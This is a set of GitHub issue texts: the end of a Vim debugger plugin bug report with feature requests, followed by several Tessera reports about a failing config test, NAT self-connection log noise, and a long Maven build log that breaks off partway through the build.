 2nd user vimrc file: "~/.vim/vimrc"
      user exrc file: "$HOME/.exrc"
       defaults file: "$VIMRUNTIME/defaults.vim"
  fall-back for $VIM: "/usr/share/vim"
Compilation: gcc -c -I. -Iproto -DHAVE_CONFIG_H   -Wdate-time  -g -O2 -fdebug-prefix-map=/build/vim-I6gBP8/vim-8.1.1967=. -fstack-protector-strong -Wformat -Werror=format-security -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=1
Linking: gcc   -Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,-z,now -Wl,--as-needed -o vim        -lm -ltinfo -lnsl  -lselinux  -lacl -lattr -lgpm -ldl     -L/usr/lib/python3.6/config-3.6m-x86_64-linux-gnu -lpython3.6m -lpthread -ldl -lutil -lm
```

* Output of `which vim`:

```
/usr/bin/vim
```

* Output of `:py3 pass`:

This isn't printing anything in my Vim version for whatever reason.

* Operating system: <linux or macOS> and version

Ubuntu 16.04 

**Additional context**
Add any other context about the problem here.
 Vim is supporting windows, as well as the dap and python3. 
So why windows is not supported? Is it possiable? There's a test framework but no real tests.

Add some tests, at least:

* Start up and debug a C program
* Setting/clearing breakpoints
* Reset - hopefully will get a repro of the frequent vim crashes
* Restart - I keep breaking this one.

etc.
<---------->
134236467
When running the _mvn install_ command, a failure in project **config** occurs as follows:
[ERROR] Tests run: 9, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.182 s <<< FAILURE! - in com.quorum.tessera.config.JaxbConfigFactoryTest
[ERROR] cantAppendToPasswordFileThrowsError(com.quorum.tessera.config.JaxbConfigFactoryTest)  Time elapsed: 0.035 s  <<< FAILURE!
java.lang.AssertionError:

Expecting actual not to be null
        at com.quorum.tessera.config.JaxbConfigFactoryTest.cantAppendToPasswordFileThrowsError(JaxbConfigFactoryTest.java:100)

[INFO] Running com.quorum.tessera.config.ConfigTest
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.ConfigTest
[INFO] Running com.quorum.tessera.config.adapters.KeyDataAdapterTest
[INFO] Tests run: 24, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.007 s - in com.quorum.tessera.config.adapters.KeyDataAdapterTest
[INFO] Running com.quorum.tessera.config.adapters.PrivateKeyTypeAdapterTest
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.adapters.PrivateKeyTypeAdapterTest
[INFO] Running com.quorum.tessera.config.adapters.PathAdapterTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.adapters.PathAdapterTest
[INFO] Running com.quorum.tessera.config.HashicorpKeyVaultConfigTest
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.HashicorpKeyVaultConfigTest
[INFO]
[INFO] Results:
[INFO]
[ERROR] Failures:
[ERROR]   JaxbConfigFactoryTest.cantAppendToPasswordFileThrowsError:100
Expecting actual not to be null
[INFO]
[ERROR] Tests run: 325, Failures: 1, Errors: 0, Skipped: 0

Then the remaining parts are all skipped and the installation exits.
How can I fix it? Retroactive issue to link against

---

> Hi Tessera team,
>
> In our Tessera 0.8 environments, the nodes are attempting to connect back to themselves to perform party discovery.
>
>I suspect this is not an issue In most environments, as the HTTPS connection would normally succeed. However, if there is NAT involved the connection fails or times out - resulting in repeated entries in the log as the SyncPoller retries the connection. We don't see a functional issue, just confusing log entries.
>
>We haven't observed this behaviour previously with Constellation.
>
>The attached code change simply filters out the local address from the unseen parties list before it attempts to connect. It removes the connection attempts / log entries in our environments. Retroactive issue to link against

---

> Hi Tessera team,
>
> In our Tessera 0.8 environments, the nodes are attempting to connect back to themselves to perform party discovery.
>
>I suspect this is not an issue In most environments, as the HTTPS connection would normally succeed. However, if there is NAT involved the connection fails or times out - resulting in repeated entries in the log as the SyncPoller retries the connection. We don't see a functional issue, just confusing log entries.
>
>We haven't observed this behaviour previously with Constellation.
>
>The attached code change simply filters out the local address from the unseen parties list before it attempts to connect. It removes the connection attempts / log entries in our environments. I have unsuccessfully attempted to install tessera. 
I'am receiving the following failure warning 
" Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:3.0.0-M3:test (default-test)"
My server is running 
Ubuntu 16.04.6 LTS
openjdk version "1.8.0_222"
OpenJDK Runtime Environment (build 1.8.0_222-8u222-b10-1ubuntu1~16.04.1-b10)
OpenJDK 64-Bit Server VM (build 25.222-b10, mixed mode)
Apache Maven 3.5.4

The install output is below:

root@production:/tessera# mvn install
[INFO] Scanning for projects...
[WARNING] 
[WARNING] Some problems were encountered while building the effective model for com.jpmorgan.quorum:argon2:jar:0.11-SNAPSHOT
[WARNING] 'dependencyManagement.dependencies.dependency.(groupId:artifactId:type:classifier)' must be unique: com.google.guava:guava:jar -> duplicate declaration of version 24.1.1-jre @ com.jpmorgan.quorum:tessera:0.11-SNAPSHOT, /tessera/pom.xml, line 1217, column 25
[WARNING] 
[WARNING] Some problems were encountered while building the effective model for com.jpmorgan.quorum:tessera:pom:0.11-SNAPSHOT
[WARNING] 'dependencyManagement.dependencies.dependency.(groupId:artifactId:type:classifier)' must be unique: com.google.guava:guava:jar -> duplicate declaration of version 24.1.1-jre @ line 1217, column 25
[WARNING] 
[WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.
[WARNING] 
[WARNING] For this reason, future Maven versions might no longer support building such malformed projects.
[WARNING] 
[INFO] ------------------------------------------------------------------------
[INFO] Detecting the operating system and CPU architecture
[INFO] ------------------------------------------------------------------------
[INFO] os.detected.name: linux
[INFO] os.detected.arch: x86_64
[INFO] os.detected.version: 4.4
[INFO] os.detected.version.major: 4
[INFO] os.detected.version.minor: 4
[INFO] os.detected.release: ubuntu
[INFO] os.detected.release.version: 16.04
[INFO] os.detected.release.like.ubuntu: true
[INFO] os.detected.release.like.debian: true
[INFO] os.detected.classifier: linux-x86_64
[INFO] ------------------------------------------------------------------------
[INFO] Reactor Build Order:
[INFO] 
[INFO] tessera                                                            [pom]
[INFO] shared                                                             [jar]
[INFO] argon2                                                             [jar]
[INFO] tests                                                              [pom]
[INFO] test-util                                                          [jar]
[INFO] service-locator                                                    [pom]
[INFO] service-locator-api                                                [jar]
[INFO] encryption                                                         [pom]
[INFO] encryption-api                                                     [jar]
[INFO] encryption-jnacl                                                   [jar]
[INFO] config                                                             [jar]
[INFO] cli                                                                [pom]
[INFO] cli-api                                                            [jar]
[INFO] key-vault                                                          [pom]
[INFO] key-vault-api                                                      [jar]
[INFO] key-generation                                                     [jar]
[INFO] config-cli                                                         [jar]
[INFO] security                                                           [jar]
[INFO] server                                                             [pom]
[INFO] server-api                                                         [jar]
[INFO] server-utils                                                       [jar]
[INFO] jersey-server                                                      [jar]
[INFO] jaxrs-client-unixsocket                                            [jar]
[INFO] enclave                                                            [pom]
[INFO] enclave-api                                                        [jar]
[INFO] tessera-data                                                       [jar]
[INFO] tessera-admin                                                      [jar]
[INFO] test-utils                                                         [pom]
[INFO] mock-service-locator                                               [jar]
[INFO] tessera-partyinfo                                                  [jar]
[INFO] tessera-core                                                       [jar]
[INFO] tessera-jaxrs                                                      [pom]
[INFO] jaxrs-client                                                       [jar]
[INFO] admin-cli                                                          [jar]
[INFO] service-locator-spring                                             [jar]
[INFO] common-jaxrs                                                       [jar]
[INFO] tessera-dist                                                       [pom]
[INFO] tessera-launcher                                                   [jar]
[INFO] tessera-grpc                                                       [pom]
[INFO] grpc                                                               [jar]
[INFO] grpc-api                                                           [jar]
[INFO] grpc-service                                                       [jar]
[INFO] grpc-server                                                        [jar]
[INFO] admin-jaxrs                                                        [jar]
[INFO] mock-jaxrs                                                         [jar]
[INFO] sync-jaxrs                                                         [jar]
[INFO] transaction-jaxrs                                                  [jar]
[INFO] thirdparty-jaxrs                                                   [jar]
[INFO] enclave-server                                                     [jar]
[INFO] enclave-jaxrs                                                      [jar]
[INFO] azure-key-vault                                                    [jar]
[INFO] hashicorp-key-vault                                                [jar]
[INFO] tessera-app                                                        [jar]
[INFO] tessera-simple                                                     [jar]
[INFO] tessera-grpc-dist                                                  [jar]
[INFO] config-migration                                                   [jar]
[INFO] ddls                                                               [jar]
[INFO] acceptance-test                                                    [jar]
[INFO] jmeter-test                                                        [jar]
[INFO] websockets-server                                                  [jar]
[INFO] encryption-kalium                                                  [jar]
[INFO] data-migration                                                     [jar]
[INFO] mock-websocket-container                                           [jar]
[INFO] tessera-sync                                                       [jar]
[INFO] 
[INFO] --------------------< com.jpmorgan.quorum:tessera >---------------------
[INFO] Building tessera 0.11-SNAPSHOT                                    [1/64]
[INFO] --------------------------------[ pom ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ tessera ---
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ tessera ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ tessera ---
[INFO] Project packaging is POM, skipping...
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ tessera ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ tessera ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ tessera ---
[INFO] Skipping JaCoCo execution due to missing execution data file:/tessera/target/jacoco.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ tessera ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ tessera ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ tessera ---
[ERROR] No .editorconfig properties applicable for files under '/tessera'
[INFO] Checked 0 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ tessera ---
[INFO] Installing /tessera/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/tessera/0.11-SNAPSHOT/tessera-0.11-SNAPSHOT.pom
[INFO] 
[INFO] ---------------------< com.jpmorgan.quorum:shared >---------------------
[INFO] Building shared 0.11-SNAPSHOT                                     [2/64]
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ shared ---
[INFO] Checking for vulnerabilities; 18 artifacts
[INFO] Exclude coordinates: []
[INFO] Exclude vulnerability identifiers: [33fe5e62-2998-4820-aebc-68e348539b22]
[INFO] CVSS-score threshold: 0.0
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ shared ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/shared/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ shared ---
[INFO] Found 17 uncompiled/modified files in /tessera/shared/src/main/java to reformat.
[INFO] Found 16 uncompiled/modified files in /tessera/shared/src/test/java to reformat.
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'rev-parse' '--show-prefix'
[INFO] Working directory: /tessera
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'status' '--porcelain' '.'
[INFO] Working directory: /tessera
[WARNING] Ignoring unrecognized line: ?? config/newPasses.txt
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ shared ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ shared ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ shared ---
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ shared ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 2 resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ shared ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-surefire-plugin:3.0.0-M3:test (default-test) @ shared ---
[INFO] 
[INFO] -------------------------------------------------------
[INFO]  T E S T S
[INFO] -------------------------------------------------------
[INFO] Running com.quorum.tessera.jaxb.JaxbCallbackTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 1.432 s - in com.quorum.tessera.jaxb.JaxbCallbackTest
[INFO] Running com.quorum.tessera.ServiceLoaderUtilTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.01 s - in com.quorum.tessera.ServiceLoaderUtilTest
[INFO] Running com.quorum.tessera.service.ServiceContainerTest
16:26:12.868 [main] WARN com.quorum.tessera.service.ServiceContainer - Service Mock for Service, hashCode: 25686279 not stopped attempt to restart.
16:26:12.875 [main] DEBUG com.quorum.tessera.service.ServiceContainer - Starting service Mock for Service, hashCode: 25686279
16:26:12.875 [main] DEBUG com.quorum.tessera.service.ServiceContainer - Started service Mock for Service, hashCode: 25686279
16:26:12.879 [main] WARN com.quorum.tessera.service.ServiceContainer - Service Mock for Service, hashCode: 1512145501 not stopped attempt to restart.
16:26:12.880 [main] DEBUG com.quorum.tessera.service.ServiceContainer - Starting service Mock for Service, hashCode: 1512145501
16:26:12.880 [main] WARN com.quorum.tessera.service.ServiceContainer - Exception thrown : null While starting service Mock for Service, hashCode: 1512145501
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.814 s - in com.quorum.tessera.service.ServiceContainerTest
[INFO] Running com.quorum.tessera.nio.unix.DelegatingFileSystemProviderTest
[INFO] Tests run: 26, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.259 s - in com.quorum.tessera.nio.unix.DelegatingFileSystemProviderTest
[INFO] Running com.quorum.tessera.nio.unix.UnixSocketFileSystemProviderTest
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.015 s - in com.quorum.tessera.nio.unix.UnixSocketFileSystemProviderTest
[INFO] Running com.quorum.tessera.reflect.ReflectCallbackTest
16:26:13.171 [main] ERROR com.quorum.tessera.reflect.ReflectCallback - null
java.lang.ClassNotFoundException: null
        at com.quorum.tessera.reflect.ReflectCallbackTest.lambda$executeThrowsClassNotFoundException$0(ReflectCallbackTest.java:13)
        at com.quorum.tessera.reflect.ReflectCallback.execute(ReflectCallback.java:15)
        at com.quorum.tessera.reflect.ReflectCallbackTest.executeThrowsClassNotFoundException(ReflectCallbackTest.java:16)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
        at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47)
        at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
        at org.junit.internal.runners.statements.ExpectException.evaluate(ExpectException.java:19)
        at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57)
        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
        at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:365)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:273)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:238)
        at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:159)
        at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:384)
        at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:345)
        at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:126)
        at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:418)
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.01 s - in com.quorum.tessera.reflect.ReflectCallbackTest
[INFO] Running com.quorum.tessera.passwords.PasswordReaderTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.123 s - in com.quorum.tessera.passwords.PasswordReaderTest
[INFO] Running com.quorum.tessera.passwords.InputStreamPasswordReaderTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.passwords.InputStreamPasswordReaderTest
[INFO] Running com.quorum.tessera.io.SystemAdapterTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.002 s - in com.quorum.tessera.io.SystemAdapterTest
[INFO] Running com.quorum.tessera.io.FilesDelegateTest
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.044 s - in com.quorum.tessera.io.FilesDelegateTest
[INFO] Running com.quorum.tessera.io.IOCallbackTest
16:26:13.362 [main] DEBUG com.quorum.tessera.io.IOCallback - null
java.io.IOException: OUCH
        at com.quorum.tessera.io.IOCallbackTest.doSomeIoStuffThatThrowsAnIoException(IOCallbackTest.java:30)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
        at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47)
        at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
        at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57)
        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
        at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:365)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:273)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:238)
        at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:159)
        at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:384)
        at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:345)
        at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:126)
        at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:418)
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.01 s - in com.quorum.tessera.io.IOCallbackTest
[INFO] Running com.quorum.tessera.io.UriCallbackTest
16:26:13.364 [main] ERROR com.quorum.tessera.reflect.ReflectCallback - null
java.net.URISyntaxException: : 
        at com.quorum.tessera.io.UriCallbackTest.lambda$executeThrowsURISyntaxException$0(UriCallbackTest.java:15)
        at com.quorum.tessera.io.UriCallback.execute(UriCallback.java:19)
        at com.quorum.tessera.io.UriCallbackTest.executeThrowsURISyntaxException(UriCallbackTest.java:13)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
        at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47)
        at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
        at org.junit.internal.runners.statements.ExpectException.evaluate(ExpectException.java:19)
        at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57)
        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
        at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:365)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:273)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:238)
        at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:159)
        at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:384)
        at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:345)
        at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:126)
        at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:418)
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.007 s - in com.quorum.tessera.io.UriCallbackTest
[INFO] 
[INFO] Results:
[INFO] 
[INFO] Tests run: 64, Failures: 0, Errors: 0, Skipped: 0
[INFO] 
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ shared ---
[INFO] Loading execution data file /tessera/shared/target/jacoco.exec
[INFO] Analyzed bundle 'shared' with 21 classes
[INFO] 
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ shared ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ shared ---
[INFO] Loading execution data file /tessera/shared/target/jacoco.exec
[INFO] Analyzed bundle 'shared' with 19 classes
[INFO] All coverage checks have been met.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ shared ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/shared/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ shared ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ shared ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ shared ---
[INFO] Installing /tessera/shared/target/shared-0.11-SNAPSHOT.jar to /root/.m2/repository/com/jpmorgan/quorum/shared/0.11-SNAPSHOT/shared-0.11-SNAPSHOT.jar
[INFO] Installing /tessera/shared/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/shared/0.11-SNAPSHOT/shared-0.11-SNAPSHOT.pom
[INFO] 
[INFO] ---------------------< com.jpmorgan.quorum:argon2 >---------------------
[INFO] Building argon2 0.11-SNAPSHOT                                     [3/64]
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ argon2 ---
[INFO] Checking for vulnerabilities; 21 artifacts
[INFO] Exclude coordinates: []
[INFO] Exclude vulnerability identifiers: [33fe5e62-2998-4820-aebc-68e348539b22]
[INFO] CVSS-score threshold: 0.0
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ argon2 ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/argon2/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ argon2 ---
[INFO] Found 4 uncompiled/modified files in /tessera/argon2/src/main/java to reformat.
[INFO] Found 1 uncompiled/modified files in /tessera/argon2/src/test/java to reformat.
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'rev-parse' '--show-prefix'
[INFO] Working directory: /tessera
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'status' '--porcelain' '.'
[INFO] Working directory: /tessera
[WARNING] Ignoring unrecognized line: ?? config/newPasses.txt
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ argon2 ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ argon2 ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ argon2 ---
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ argon2 ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ argon2 ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-surefire-plugin:3.0.0-M3:test (default-test) @ argon2 ---
[INFO] 
[INFO] -------------------------------------------------------
[INFO]  T E S T S
[INFO] -------------------------------------------------------
[INFO] Running com.quorum.tessera.argon2.Argon2Test
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 6.121 s - in com.quorum.tessera.argon2.Argon2Test
[INFO] 
[INFO] Results:
[INFO] 
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0
[INFO] 
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ argon2 ---
[INFO] Loading execution data file /tessera/argon2/target/jacoco.exec
[INFO] Analyzed bundle 'argon2' with 4 classes
[INFO] 
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ argon2 ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ argon2 ---
[INFO] Loading execution data file /tessera/argon2/target/jacoco.exec
[INFO] Analyzed bundle 'argon2' with 4 classes
[INFO] All coverage checks have been met.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ argon2 ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/argon2/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ argon2 ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ argon2 ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ argon2 ---
[INFO] Installing /tessera/argon2/target/argon2-0.11-SNAPSHOT.jar to /root/.m2/repository/com/jpmorgan/quorum/argon2/0.11-SNAPSHOT/argon2-0.11-SNAPSHOT.jar
[INFO] Installing /tessera/argon2/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/argon2/0.11-SNAPSHOT/argon2-0.11-SNAPSHOT.pom
[INFO] 
[INFO] ---------------------< com.jpmorgan.quorum:tests >----------------------
[INFO] Building tests 0.11-SNAPSHOT                                      [4/64]
[INFO] --------------------------------[ pom ]---------------------------------
[INFO] 
